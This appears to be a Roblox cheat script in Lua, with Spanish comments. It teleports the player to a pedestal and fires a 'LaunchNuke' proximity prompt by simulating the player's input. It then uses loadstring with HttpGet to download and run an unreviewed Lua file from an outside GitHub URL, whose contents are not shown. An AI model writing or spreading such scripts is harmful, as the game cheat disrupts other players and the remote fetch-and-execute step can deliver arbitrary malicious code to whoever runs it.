-- LocalScript (StarterPlayerScripts)

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

-- Posición exacta del prompt
local promptPosition = Vector3.new(57, 4, 206)

-- Referencia al Part y al ProximityPrompt
local partPedestal = workspace:WaitForChild("Spawnm"):WaitForChild("Part")
local prompt = partPedestal:FindFirstChild("LaunchNuke") -- ProximityPrompt

local canActivate = true

local function teleportaYActiva()
    if not canActivate then return end
    canActivate = false

    local character = player.Character or player.CharacterAdded:Wait()
    local hrp = character:WaitForChild("HumanoidRootPart")

    -- Teletransportar exactamente a la posición del prompt + offset
    local teleportPosition = promptPosition + Vector3.new(0, 3, 0)
    hrp.CFrame = CFrame.new(teleportPosition)

    -- Enfocar la cámara al prompt
    camera.CameraType = Enum.CameraType.Scriptable
    camera.CFrame = CFrame.new(teleportPosition + Vector3.new(0, 3, 5), promptPosition)

    -- Esperar 0.3 segundos antes de activar el prompt
    wait(0.3)

    -- Simular click al ProximityPrompt
    if prompt and prompt:IsA("ProximityPrompt") then
        prompt:InputTriggered()
    end

    -- Ejecutar el loadstring externo después de activar el prompt
    loadstring(game:HttpGet("https://raw.githubusercontent.com/davidsebas348-hub/Text191/refs/heads/main/Text192.lua", true))()

    wait(0.5) -- esperar antes de devolver control
    camera.CameraType = Enum.CameraType.Custom
    camera.CameraSubject = character:WaitForChild("Humanoid")

    canActivate = true
end

-- Función que verifica el team
local function checkTeam()
    if player.Team and player.Team.Name == "Lobby" then
        task.delay(5, teleportaYActiva) -- esperar 5 segundos antes de teleport
    end
end

-- Ejecutar al inicio
checkTeam()

-- Escuchar cambios de team
player:GetPropertyChangedSignal("Team"):Connect(function()
    checkTeam()
end)
